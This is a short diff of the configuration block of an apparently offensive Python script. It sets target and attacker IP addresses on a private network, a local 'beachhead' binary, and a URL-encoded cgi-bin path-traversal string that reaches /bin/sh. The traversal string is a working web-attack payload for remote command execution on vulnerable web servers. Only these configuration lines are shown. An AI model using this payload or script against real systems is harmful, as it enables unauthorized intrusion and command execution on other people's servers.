@@ -6,7 +6,7 @@ import string
 
 # --- Configuration ---
 target_ip = "10.37.1.149"
-attacker_ip = "10.37.1.249" 
+attacker_ip = "10.37.1.149" 
 local_binary = "./beachhead/beachhead"
 
 traversal = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
